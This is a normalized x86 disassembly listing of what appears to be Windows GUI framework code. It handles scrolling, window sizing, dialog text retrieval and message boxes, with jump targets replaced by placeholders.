push 0x0
lea ecx [ ebp - 0x24 ]
mov eax [ esi + 0x40 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov [ esi + 0x40 ] eax
mov eax [ ebp + 0xc ]
mov [ esi + 0x44 ] eax
mov eax [ ebp + 0x10 ]
mov [ esi + 0x48 ] eax
call sub_44756d
push [ esi + 0x40 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x24 ]
call sub_446f0f
mov ecx [ esi + 0x44 ]
mov edi [ LPtoDP@IAT ]
lea eax [ esi + 0x4c ]
push 0x1
push eax
push [ ebp - 0x1c ]
mov [ eax ] ecx
mov ecx [ esi + 0x48 ]
mov [ eax + 0x4 ] ecx
call edi
mov eax [ ebp + 0x14 ]
lea ebx [ esi + 0x54 ]
push 0x1
push ebx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push [ ebp - 0x1c ]
mov [ ebx ] ecx
mov [ ebx + 0x4 ] eax
call edi
mov eax [ ebp + 0x18 ]
push 0x1
mov ecx [ eax ]
mov edx [ eax + 0x4 ]
lea eax [ esi + 0x5c ]
push eax
push [ ebp - 0x1c ]
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
call edi
mov eax [ esi + 0x50 ]
test eax eax
jge r-xdata
mov eax [ esi + 0x58 ]
test eax eax
jge r-xdata
neg eax
mov [ esi + 0x50 ] eax
mov eax [ esi + 0x60 ]
test eax eax
jge r-xdata
neg eax
mov [ esi + 0x58 ] eax
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x24 ]
call sub_4475df
cmp [ ebx ] 0x0
push 0xa
pop ecx
jne r-xdata
neg eax
mov [ esi + 0x60 ] eax
cmp [ esi + 0x58 ] 0x0
jne r-xdata
mov eax [ esi + 0x4c ]
mov edi ecx
cdq
idiv edi
mov [ ebx ] eax
xor edi edi
cmp [ esi + 0x5c ] edi
jne r-xdata
mov eax [ esi + 0x50 ]
mov edi ecx
cdq
idiv edi
mov [ esi + 0x58 ] eax
cmp [ esi + 0x60 ] edi
jne r-xdata
mov eax [ ebx ]
mov ebx ecx
cdq
idiv ebx
mov [ esi + 0x5c ] eax
cmp [ esi + 0x1c ] edi
je r-xdata
mov eax [ esi + 0x58 ]
cdq
idiv ecx
mov [ esi + 0x60 ] eax
mov ecx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x14
mov ecx esi
call sub_448df8
mov eax [ ebp - 0x10 ]
cmp eax [ esi + 0x40 ]
je r-xdata
push 0x1
push edi
push [ esi + 0x1c ]
call [ InvalidateRect@IAT ]
sub_448ad5
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
mov esi ecx
push 0x1
call sub_43fff9
push 0x0
mov ecx esi
mov edi eax
call sub_43fff9
cmp [ esi + 0x64 ] 0x0
mov ebx eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] ebx
mov [ eax + 0x4 ] edi
pop edi
pop esi
pop ebx
leave
retn 0x4
lea eax [ ebp - 0x10 ]
push eax
push [ esi + 0x1c ]
call [ GetClientRect@IAT ]
mov eax [ ebp - 0x8 ]
mov ecx [ esi + 0x4c ]
mov edx eax
sub edx [ ebp - 0x10 ]
cmp ecx edx
jge r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ esi + 0x50 ]
mov ecx eax
sub ecx [ ebp - 0xc ]
cmp esi ecx
jge r-xdata
sub eax ecx
push 0xfffffffe
sub eax [ ebp - 0x10 ]
pop ecx
cdq
idiv ecx
mov ebx eax
sub eax esi
push 0xfffffffe
sub eax [ ebp - 0xc ]
pop ecx
cdq
idiv ecx
mov edi eax
sub_448b4e
push ebx
push esi
push edi
mov ebx ecx
push 0x0
call sub_43fff9
push 0x1
mov ecx ebx
push [ esp + 0x14 ]
mov esi eax
push 0x0
call sub_43ffc9
push 0x1
mov ecx ebx
call sub_43fff9
push 0x1
mov ecx ebx
push [ esp + 0x18 ]
mov edi eax
push 0x1
call sub_43ffc9
sub edi [ esp + 0x14 ]
sub esi [ esp + 0x10 ]
push 0x0
push 0x0
push edi
push esi
mov ecx ebx
call sub_4401a8
pop edi
pop esi
pop ebx
retn 0x8
sub_448ba0
push esi
mov esi ecx
call sub_43e71a
cmp [ esi + 0x40 ] 0xffffffff
jne r-xdata
mov ecx esi
call sub_448df8
push [ esi + 0x48 ]
mov ecx esi
push [ esi + 0x44 ]
call sub_448918
jmp r-xdata
pop esi
retn 0xc
sub_448bc8
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
lea eax [ ebp - 0x10 ]
push edi
mov ebx ecx
push eax
push [ ebx + 0x1c ]
call [ GetClientRect@IAT ]
mov eax [ ebp - 0x8 ]
mov edi [ ebp + 0x8 ]
sub eax [ ebp - 0x10 ]
mov esi [ ebp + 0xc ]
mov ecx ebx
cdq
sub eax edx
sar eax 0x1
sub edi eax
mov eax [ ebp - 0x4 ]
sub eax [ ebp - 0xc ]
cdq
sub eax edx
sar eax 0x1
sub esi eax
call sub_44163f
test eax 0x100000
mov [ ebp + 0xc ] eax
je r-xdata
xor edi edi
test edi edi
jl r-xdata
xor esi esi
test esi esi
jl r-xdata
push 0x0
mov ecx ebx
call sub_440161
cmp edi eax
jle r-xdata
push 0x1
mov ecx ebx
call sub_440161
cmp esi eax
jle r-xdata
test [ ebp + 0xe ] 0x20
je r-xdata
mov edi eax
jmp r-xdata
push 0x1
push edi
push 0x0
mov ecx ebx
call sub_43ffc9
push 0x1
push esi
push 0x1
mov ecx ebx
call sub_43ffc9
pop edi
pop esi
pop ebx
leave
retn 0x8
mov esi eax
jmp r-xdata
sub_448c64
push ebx
push ebp
push esi
mov esi [ esp + 0x10 ]
push edi
mov edi ecx
and [ esi + 0x4 ] 0x0
and [ esi ] 0x0
call sub_44163f
mov ebp eax
mov eax [ edi ]
push 0x1
mov ecx edi
call [ eax + 0x68 ]
test eax eax
mov ebx 0x800000
jne r-xdata
mov eax [ edi ]
push 0x0
mov ecx edi
call [ eax + 0x68 ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
test ebx ebp
mov [ esi ] eax
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn 0x4
mov eax [ rw-data ]
test ebx ebp
mov [ esi + 0x4 ] eax
je r-xdata
dec [ esi ]
dec [ esi + 0x4 ]
sub_448cbe
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
lea eax [ ebp - 0x10 ]
push edi
mov ebx ecx
push eax
push [ ebx + 0x1c ]
call [ GetClientRect@IAT ]
mov esi [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
mov ecx ebx
mov [ esi ] eax
mov eax [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
call sub_44163f
mov edi [ ebp + 0xc ]
mov ecx ebx
push edi
mov [ ebp + 0x8 ] eax
call sub_448c64
mov eax [ edi ]
test eax eax
je r-xdata
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
test [ ebp + 0xa ] 0x20
je r-xdata
mov eax [ esi ]
cmp eax [ edi ]
jle r-xdata
test [ ebp + 0xa ] 0x10
je r-xdata
add [ esi ] eax
xor eax eax
mov eax [ esi + 0x4 ]
cmp eax [ edi + 0x4 ]
jle r-xdata
add [ esi + 0x4 ] eax
push 0x1
pop eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x8
sub_448d33
push ebp
mov ebp esp
push ecx
push ecx
push esi
lea eax [ ebp - 0x8 ]
push edi
mov edi ecx
push eax
call sub_448c64
mov eax [ edi + 0x4c ]
mov ecx [ edi + 0x50 ]
sub eax [ ebp + 0x8 ]
mov esi [ ebp + 0x14 ]
sub ecx [ ebp + 0xc ]
mov [ esi ] eax
lea eax [ ebp + 0x8 ]
mov [ esi + 0x4 ] ecx
push eax
mov ecx edi
call sub_448ad5
mov ecx eax
mov eax [ ebp + 0x18 ]
xor edi edi
mov edx [ ecx ]
mov [ eax ] edx
mov edx [ ebp - 0x4 ]
mov ecx [ ecx + 0x4 ]
mov [ eax + 0x4 ] ecx
xor ecx ecx
cmp [ esi ] edi
setg cl
cmp ecx edi
mov [ ebp + 0x14 ] ecx
jne r-xdata
cmp [ ebp + 0x1c ] edi
je r-xdata
mov [ eax ] edi
jmp r-xdata
mov ecx [ esi + 0x4 ]
push ebx
xor ebx ebx
cmp ecx edi
setg bl
cmp ebx edi
mov [ ebp + 0x18 ] ebx
jne r-xdata
add [ esi + 0x4 ] edx
cmp [ ebp + 0x1c ] edi
je r-xdata
mov [ eax + 0x4 ] edi
jmp r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
mov ebx [ ebp - 0x8 ]
add [ esi ] ebx
mov ecx [ esi ]
pop ebx
cmp ecx edi
jle r-xdata
cmp [ esi ] edi
jle r-xdata
mov esi [ esi + 0x4 ]
cmp esi edi
jle r-xdata
cmp [ eax ] ecx
jl r-xdata
add ecx edx
mov [ ebp + 0x14 ] 0x1
mov [ esi + 0x4 ] ecx
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x14 ]
pop edi
pop esi
mov [ eax ] ecx
mov ecx [ ebp + 0x18 ]
mov [ eax + 0x4 ] ecx
leave
retn 0x18
cmp [ eax + 0x4 ] esi
jl r-xdata
mov [ eax ] ecx
mov [ eax + 0x4 ] esi
sub_448df8
push ebp
mov ebp esp
sub esp 0x68
push ebx
push esi
push edi
mov esi ecx
xor edi edi
cmp [ esi + 0x68 ] edi
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
push 0x1
pop ebx
push [ esi + 0x1c ]
mov [ esi + 0x68 ] ebx
mov [ ebp - 0x4 ] ebx
call [ GetParent@IAT ]
push eax
call sub_43e7b3
cmp eax edi
je r-xdata
lea eax [ ebp - 0x1c ]
mov ecx esi
push eax
lea eax [ ebp - 0xc ]
push eax
call sub_448cbe
test eax eax
jne r-xdata
lea ecx [ ebp - 0x3c ]
push ecx
push edi
push 0x368
push [ eax + 0x1c ]
call [ SendMessageA@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
lea eax [ ebp - 0x4c ]
push eax
push [ esi + 0x1c ]
call [ GetClientRect@IAT ]
cmp [ ebp - 0x44 ] edi
jle r-xdata
lea eax [ ebp - 0x1c ]
mov ecx esi
push eax
mov [ ebp - 0x4 ] edi
call sub_448c64
mov ecx [ ebp - 0x34 ]
mov eax [ ebp - 0x30 ]
sub ecx [ ebp - 0x3c ]
sub eax [ ebp - 0x38 ]
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebp - 0x10 ] edi
je r-xdata
mov eax [ ebp - 0x18 ]
sub [ ebp - 0x8 ] eax
mov [ esi + 0x68 ] edi
cmp [ ebp - 0x40 ] edi
jle r-xdata
push [ ebp - 0x4 ]
lea edx [ ebp - 0x24 ]
push edx
lea edx [ ebp - 0x2c ]
push edx
lea edx [ ebp - 0x14 ]
push edx
push eax
push ecx
mov ecx esi
call sub_448d33
cmp [ ebp - 0x14 ] edi
je r-xdata
push [ ebp - 0x20 ]
mov ecx esi
push [ ebp - 0x24 ]
call sub_448b4e
push [ ebp - 0x14 ]
mov ecx esi
mov [ ebp - 0x64 ] 0x3
mov [ ebp - 0x60 ] edi
push edi
call sub_440084
cmp [ ebp - 0x14 ] edi
je r-xdata
mov eax [ ebp - 0x1c ]
sub [ ebp - 0xc ] eax
push edi
push 0x3
mov ecx esi
call sub_440084
jmp r-xdata
push [ ebp - 0x10 ]
mov ecx esi
push ebx
call sub_440084
cmp [ ebp - 0x10 ] edi
je r-xdata
mov eax [ ebp - 0xc ]
push ebx
mov [ ebp - 0x58 ] eax
mov eax [ esi + 0x4c ]
dec eax
mov ecx esi
mov [ ebp - 0x5c ] eax
lea eax [ ebp - 0x68 ]
push eax
push edi
call sub_4400c7
test eax eax
jne r-xdata
mov eax [ ebp - 0x8 ]
push ebx
mov [ ebp - 0x58 ] eax
mov eax [ esi + 0x50 ]
dec eax
mov ecx esi
mov [ ebp - 0x5c ] eax
lea eax [ ebp - 0x68 ]
push eax
push ebx
call sub_4400c7
test eax eax
jne r-xdata
push ebx
mov ecx esi
push [ ebp - 0x2c ]
push edi
push edi
call sub_440021
push ebx
mov ecx esi
push [ ebp - 0x28 ]
push edi
push ebx
call sub_440021
sub_448f6d
push ebp
mov ebp esp
push ecx
push ecx
cmp [ ebp + 0xc ] 0x1
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edi
jne r-xdata
call sub_441659
and ah 0xfd
mov ecx edi
push eax
push 0x0
call sub_44163f
push eax
push [ ebp + 0x8 ]
call [ AdjustWindowRectEx@IAT ]
call sub_441659
mov esi [ ebp + 0x8 ]
push eax
push 0x0
push 0x0
push esi
call [ AdjustWindowRectEx@IAT ]
cmp [ edi + 0x40 ] 0xffffffff
je r-xdata
pop edi
pop esi
leave
retn 0x8
mov eax [ esi + 0x8 ]
mov ecx [ esi + 0xc ]
sub eax [ esi ]
sub ecx [ esi + 0x4 ]
push ebx
mov ebx [ edi + 0x4c ]
mov edi [ edi + 0x50 ]
sub ebx eax
lea eax [ ebp - 0x8 ]
sub edi ecx
mov ecx [ ebp - 0x4 ]
push eax
call sub_448c64
test edi edi
jle r-xdata
test ebx ebx
pop ebx
jle r-xdata
mov eax [ ebp - 0x8 ]
add [ esi + 0x8 ] eax
mov eax [ ebp - 0x4 ]
add [ esi + 0xc ] eax
jmp r-xdata
sub_448ff4
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x0
push esi
mov esi ecx
je r-xdata
mov eax [ esi ]
push 0x0
mov ecx esi
call [ eax + 0x68 ]
cmp [ ebp + 0x10 ] eax
jne r-xdata
mov ecx [ ebp + 0x10 ]
push 0x0
call sub_440551
test eax eax
jne r-xdata
pop esi
pop ebp
retn 0xc
movzx ecx [ ebp + 0x8 ]
mov eax [ esi ]
push 0x1
push [ ebp + 0xc ]
or ch 0xff
push ecx
mov ecx esi
call [ eax + 0xbc ]
sub_449038
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x0
push esi
mov esi ecx
je r-xdata
mov eax [ esi ]
push 0x1
mov ecx esi
call [ eax + 0x68 ]
cmp [ ebp + 0x10 ] eax
jne r-xdata
mov ecx [ ebp + 0x10 ]
push 0x0
call sub_440551
test eax eax
jne r-xdata
pop esi
pop ebp
retn 0xc
xor ecx ecx
mov eax [ esi ]
mov ch [ ebp + 0x8 ]
push 0x1
push [ ebp + 0xc ]
movzx ecx cx
or cl 0xff
push ecx
mov ecx esi
call [ eax + 0xbc ]
sub_449080
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0xc
push esi
mov esi ecx
jne r-xdata
xor eax eax
jmp r-xdata
push 0x1
push esi
call sub_44691b
test eax eax
je r-xdata
pop esi
pop ebp
retn 0x10
push [ ebp + 0x14 ]
mov ecx esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4490b4
sub_4490b4
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
mov esi ecx
call sub_44163f
push 0x1
mov ebx eax
mov eax [ esi ]
pop edi
push edi
mov ecx esi
call [ eax + 0x68 ]
test eax eax
je r-xdata
test ebx 0x200000
jne r-xdata
mov ecx eax
call sub_441826
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] edi
and [ ebp - 0x4 ] 0x0
jmp r-xdata
test ebx 0x100000
jne r-xdata
mov ecx eax
call sub_441826
test eax eax
jne r-xdata
mov eax [ esi ]
push 0x0
mov ecx esi
call [ eax + 0x68 ]
test eax eax
je r-xdata
mov [ ebp - 0x8 ] edi
and [ ebp - 0x8 ] 0x0
jmp r-xdata
call sub_4486ae
cmp [ ebp - 0x4 ] 0x0
mov ebx eax
je r-xdata
cmp [ ebp - 0x8 ] edi
jne r-xdata
xor edi edi
cmp [ ebp - 0x4 ] edi
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
movsx eax [ ebp + 0xc ]
push 0x78
push ebx
neg eax
push eax
call [ MulDiv@IAT ]
cmp eax 0xffffffff
je r-xdata
xor eax eax
jmp r-xdata
mov eax edi
movsx eax [ ebp + 0xc ]
push 0x78
push ebx
neg eax
push eax
call [ MulDiv@IAT ]
cmp eax 0xffffffff
je r-xdata
cmp [ ebp + 0xc ] 0x0
mov ecx [ esi + 0x58 ]
jle r-xdata
cmp ebx 0xffffffff
je r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x10
cmp [ ebp + 0xc ] 0x0
mov ecx [ esi + 0x54 ]
jle r-xdata
cmp ebx 0xffffffff
je r-xdata
mov edx [ esi ]
xor eax eax
push 0x1
push ecx
push eax
jmp r-xdata
neg ecx
mov ecx [ esi + 0x60 ]
imul ecx eax
mov eax [ esi + 0x58 ]
cmp ecx eax
jl r-xdata
mov edx [ esi ]
xor eax eax
push 0x1
push eax
push ecx
neg ecx
mov ecx [ esi + 0x5c ]
imul ecx eax
mov eax [ esi + 0x54 ]
cmp ecx eax
jl r-xdata
mov ecx esi
call [ edx + 0xc0 ]
mov edi eax
test edi edi
je r-xdata
mov ecx eax
jmp r-xdata
push [ esi + 0x1c ]
call [ UpdateWindow@IAT ]
mov ecx eax
jmp r-xdata
sub_4491df
push ebp
mov ebp esp
push ecx
push esi
push edi
mov edi ecx
push 0x0
call sub_43fff9
mov esi eax
movzx eax [ ebp + 0x8 ]
sub eax 0x0
mov [ ebp - 0x4 ] esi
je r-xdata
sub esi [ edi + 0x5c ]
dec eax
je r-xdata
sub eax [ edi + 0x60 ]
dec ecx
je r-xdata
add esi [ edi + 0x5c ]
jmp r-xdata
dec eax
je r-xdata
mov eax esi
pop edi
pop esi
leave
retn 0xc
cmp [ ebp + 0x10 ] 0x0
je r-xdata
add eax [ edi + 0x60 ]
jmp r-xdata
dec ecx
je r-xdata
push 0x1
mov ecx edi
call sub_43fff9
xor ecx ecx
mov edx eax
mov cl [ ebp + 0x9 ]
movzx ecx cl
sub ecx 0x0
je r-xdata
sub esi [ edi + 0x54 ]
jmp r-xdata
dec eax
je r-xdata
push [ edi + 0x1c ]
call [ UpdateWindow@IAT ]
push [ ebp + 0x10 ]
sub esi [ ebp - 0x4 ]
sub eax edx
mov edx [ edi ]
push eax
push esi
mov ecx edi
call [ edx + 0xc0 ]
mov esi eax
test esi esi
je r-xdata
sub eax [ edi + 0x58 ]
jmp r-xdata
dec ecx
je r-xdata
add esi [ edi + 0x54 ]
jmp r-xdata
dec eax
dec eax
je r-xdata
add eax [ edi + 0x58 ]
jmp r-xdata
dec ecx
dec ecx
je r-xdata
mov esi [ ebp + 0xc ]
jmp r-xdata
dec eax
je r-xdata
mov eax [ ebp + 0xc ]
jmp r-xdata
dec ecx
je r-xdata
xor esi esi
jmp r-xdata
dec eax
jne r-xdata
xor eax eax
jmp r-xdata
dec ecx
jne r-xdata
mov esi 0x7fffffff
jmp r-xdata
mov eax 0x7fffffff
jmp r-xdata
sub_4492af
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
mov esi ecx
call sub_44163f
mov ebx eax
mov eax [ esi ]
push 0x1
mov ecx esi
call [ eax + 0x68 ]
xor edi edi
cmp eax edi
je r-xdata
test ebx 0x200000
jne r-xdata
mov ecx eax
call sub_441826
test eax eax
je r-xdata
mov eax [ esi ]
push edi
mov ecx esi
call [ eax + 0x68 ]
cmp eax edi
je r-xdata
mov [ ebp + 0xc ] edi
jmp r-xdata
test ebx 0x100000
jne r-xdata
mov ecx eax
call sub_441826
test eax eax
je r-xdata
push edi
mov ecx esi
call sub_43fff9
mov ebx eax
push edi
mov ecx esi
mov [ ebp - 0x4 ] ebx
call sub_440161
add ebx [ ebp + 0x8 ]
jns r-xdata
mov [ ebp + 0x8 ] edi
jmp r-xdata
cmp ebx eax
jle r-xdata
xor ebx ebx
jmp r-xdata
push 0x1
mov ecx esi
call sub_43fff9
mov edi eax
push 0x1
mov ecx esi
mov [ ebp - 0x8 ] edi
call sub_440161
add edi [ ebp + 0xc ]
jns r-xdata
mov ebx eax
cmp edi eax
jle r-xdata
xor edi edi
jmp r-xdata
cmp ebx [ ebp - 0x4 ]
jne r-xdata
mov edi eax
xor eax eax
cmp [ ebp + 0x10 ] eax
je r-xdata
cmp edi [ ebp - 0x8 ]
jne r-xdata
push 0x1
pop eax
push eax
push eax
mov eax [ ebp - 0x8 ]
mov ecx esi
sub eax edi
push eax
mov eax [ ebp - 0x4 ]
sub eax ebx
push eax
call sub_4401a8
cmp ebx [ ebp - 0x4 ]
je r-xdata
xor eax eax
jmp r-xdata
cmp edi [ ebp - 0x8 ]
je r-xdata
push 0x1
push ebx
push 0x0
mov ecx esi
call sub_43ffc9
pop edi
pop esi
pop ebx
leave
retn 0xc
push 0x1
push edi
push 0x1
mov ecx esi
call sub_43ffc9
sub_4493c2
push ebp
mov ebp esp
lea eax [ ebp + 0x8 ]
push esi
mov esi ecx
push eax
push [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
call sub_4415af
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
and [ esi + 0xc ] 0x0
mov [ esi + 0x8 ] eax
pop esi
pop ebp
retn 0x4
call sub_43b7ce
sub_4493f1
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
push [ ebp + 0xc ]
mov ecx edi
call sub_4493ab
cmp [ edi ] 0x0
mov esi eax
je r-xdata
mov eax [ ebp + 0x10 ]
push [ eax ]
push esi
call sub_447993
push esi
call [ GetWindowTextLengthA@IAT ]
lea ecx [ eax + 0x1 ]
push ecx
mov ecx [ ebp + 0x10 ]
push eax
call sub_4425ef
push eax
push esi
call [ GetWindowTextA@IAT ]
mov ecx [ ebp + 0x10 ]
push 0xffffffff
call sub_4425c7
jmp r-xdata
pop edi
pop esi
pop ebp
retn 0xc
sub_449443
push esi
mov esi [ esp + 0x8 ]
push edi
mov ecx esi
push [ esp + 0x10 ]
call sub_4493c2
xor edi edi
cmp [ esi ] edi
je r-xdata
mov ecx [ esp + 0x14 ]
mov edx [ ecx ]
cmp edx edi
jl r-xdata
push edi
push edi
push 0xf0
push eax
call [ SendMessageA@IAT ]
mov ecx [ esp + 0x14 ]
mov [ ecx ] eax
jmp r-xdata
mov [ ecx ] edi
cmp edx 0x2
jle r-xdata
pop edi
pop esi
retn 0xc
push edi
push [ ecx ]
push 0xf1
push eax
call [ SendMessageA@IAT ]
sub_449495
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
mov ecx esi
push [ ebp + 0xc ]
call sub_4493c2
cmp [ esi ] 0x0
mov edi eax
je r-xdata
mov esi [ ebp + 0x10 ]
push [ esi ]
push 0xffffffff
push 0x14d
push edi
call [ SendMessageA@IAT ]
cmp eax 0xffffffff
jne r-xdata
push edi
call [ GetWindowTextLengthA@IAT ]
test eax eax
jle r-xdata
pop edi
pop esi
pop ebp
retn 0xc
push [ esi ]
push edi
call sub_447993
mov ecx [ ebp + 0x10 ]
push 0x100
push 0xff
call sub_442578
lea ecx [ eax + 0x1 ]
push ecx
mov ecx [ ebp + 0x10 ]
push eax
call sub_4425ef
jmp r-xdata
push eax
push edi
call [ GetWindowTextA@IAT ]
mov ecx [ ebp + 0x10 ]
push 0xffffffff
call sub_4425c7
jmp r-xdata
sub_449514
push esi
mov esi [ esp + 0x8 ]
push [ esp + 0xc ]
mov ecx esi
call sub_4493c2
xor ecx ecx
cmp [ esi ] ecx
pop esi
push ecx
je r-xdata
mov ecx [ esp + 0x10 ]
push [ ecx ]
push 0x14e
push eax
call [ SendMessageA@IAT ]
push ecx
push 0x147
push eax
call [ SendMessageA@IAT ]
mov ecx [ esp + 0xc ]
mov [ ecx ] eax
jmp r-xdata
retn 0xc
sub_449556
push esi
push edi
mov edi [ esp + 0x14 ]
cmp [ edi + 0x1c ] 0x0
jne r-xdata
pop edi
pop esi
retn 0xc
mov esi [ esp + 0xc ]
push [ esp + 0x10 ]
mov ecx esi
call sub_4493c2
push eax
mov ecx edi
call sub_4414f4
test eax eax
jne r-xdata
push [ edi + 0x1c ]
mov esi [ esi + 0x4 ]
call [ GetParent@IAT ]
cmp [ esi + 0x1c ] eax
je r-xdata
call sub_43b7ce
jmp r-xdata
push esi
mov ecx edi
call sub_44190f
sub_4495a2
push esi
call sub_420710
mov esi eax
test esi esi
je r-xdata
pop esi
retn 0x4
mov eax [ esi ]
mov ecx esi
call [ eax + 0xb0 ]
test eax eax
je r-xdata
mov ecx [ esi + 0x68 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push [ esp + 0x8 ]
call [ eax + 0x64 ]
sub_4495d0
push ebp
mov ebp esp
sub esp 0x114
push ebx
push esi
push edi
xor ebx ebx
mov edi ecx
push ebx
mov [ ebp - 0x10 ] edi
call sub_4495a2
lea eax [ ebp - 0x4 ]
push eax
push ebx
call sub_449748
xor esi esi
cmp eax ebx
mov [ ebp - 0xc ] eax
je r-xdata
cmp edi ebx
je r-xdata
push ebx
push ebx
push 0x376
push [ ebp - 0x4 ]
call [ SendMessageA@IAT ]
cmp eax ebx
je r-xdata
cmp esi ebx
mov [ ebp - 0x8 ] ebx
je r-xdata
lea esi [ edi + 0x9c ]
mov esi eax
jmp r-xdata
mov ebx [ ebp + 0xc ]
test bl 0xf0
jne r-xdata
mov eax [ esi ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
cmp eax ebx
je r-xdata
test edi edi
je r-xdata
mov eax ebx
and eax 0xf
cmp eax 0x1
jbe r-xdata
add eax 0x30000
mov [ esi ] eax
lea eax [ ebp - 0x114 ]
push 0x104
push eax
push 0x0
lea edi [ ebp - 0x114 ]
call [ GetModuleFileNameA@IAT ]
mov edi [ edi + 0x78 ]
jmp r-xdata
or ebx 0x30
cmp eax 0x2
jbe r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ esi ] eax
push ebx
push edi
push [ ebp + 0x8 ]
push [ ebp - 0xc ]
call [ MessageBoxA@IAT ]
test esi esi
mov edi eax
je r-xdata
cmp eax 0x4
ja r-xdata
mov ecx [ ebp - 0x10 ]
push 0x1
call sub_4495a2
mov eax edi
pop edi
pop esi
pop ebx
leave
retn 0xc
push 0x1
push [ ebp - 0x4 ]
call [ EnableWindow@IAT ]
sub_4496b7
push ebp
mov ebp esp
call sub_45357b
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
push [ ebp + 0x10 ]
xor ecx ecx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4495d0
push [ ebp + 0x10 ]
mov edx [ eax ]
mov ecx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ edx + 0x8c ]
jmp r-xdata
pop ebp
retn 0xc
sub_4496ef
mov eax sub_463620
call sub_42dc88
push ecx
mov eax [ rw-data ]
mov [ ebp - 0x10 ] eax
push [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x10 ]
call sub_4437c6
mov eax [ ebp + 0x10 ]
cmp eax 0xffffffff
jne r-xdata
push esi
push eax
push [ ebp + 0xc ]
push [ ebp - 0x10 ]
call sub_4496b7
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x10 ]
mov esi eax
call sub_442148
mov ecx [ ebp - 0xc ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0xc
mov eax [ ebp + 0x8 ]
sub_449748
push ebx
mov ebx [ GetParent@IAT ]
push ebp
mov ebp [ esp + 0xc ]
push esi
push edi
test ebp ebp
mov esi ebp
jne r-xdata
push 0xfffffff0
push esi
call [ GetWindowLongA@IAT ]
test eax 0x40000000
je r-xdata
call sub_4497e4
test eax eax
jne r-xdata
test esi esi
mov edi esi
mov eax esi
je r-xdata
push esi
call ebx
mov esi eax
jmp r-xdata
mov esi [ eax + 0x1c ]
call sub_420710
test eax eax
jne r-xdata
test ebp ebp
jne r-xdata
push eax
mov edi eax
call ebx
test eax eax
jne r-xdata
test esi esi
je r-xdata
xor esi esi
mov ebx [ esp + 0x18 ]
test ebx ebx
je r-xdata
test esi esi
je r-xdata
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
retn 0x8
test edi edi
je r-xdata
push esi
call [ GetLastActivePopup@IAT ]
mov esi eax
and [ ebx ] 0x0
push edi
call [ IsWindowEnabled@IAT ]
test eax eax
je r-xdata
cmp edi esi
je r-xdata
push 0x0
push edi
mov [ ebx ] edi
call [ EnableWindow@IAT ]
jmp r-xdata
sub_4497f0
mov edx [ ecx + 0x58 ]
push esi
test edx edx
jle r-xdata
or eax 0xffffffff
mov ecx [ ecx + 0x5c ]
xor eax eax
test edx edx
jle r-xdata
mov esi [ ecx ]
cmp esi [ esp + 0x8 ]
je r-xdata
pop esi
retn 0x4
inc eax
add ecx 0x14
cmp eax edx
jl r-xdata
sub_449829
push ebp
mov ebp esp
push ecx
mov edx [ ecx + 0x5c ]
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
mov edi [ ebp + 0xc ]
lea eax [ ebx + ebx * 4 ]
mov [ ebp - 0x4 ] ecx
lea esi [ edx + eax * 4 ]
mov eax [ edx + eax * 4 + 0x8 ]
cmp eax edi
je r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x8
xor eax edi
test eax 0x8000000
je r-xdata
mov ecx [ ebp - 0x4 ]
or [ esi + 0xc ] 0x1
push 0x1
mov [ esi + 0x8 ] edi
push [ esi + 0x10 ]
push ebx
call sub_44987b
push 0x0
push 0x1
mov [ esi + 0x8 ] edi
call sub_4539dc
sub_44987b
mov eax sub_4637c4
call sub_42dc88
push ecx
push ecx
mov eax [ ebp + 0x8 ]
push ebx
mov ebx ecx
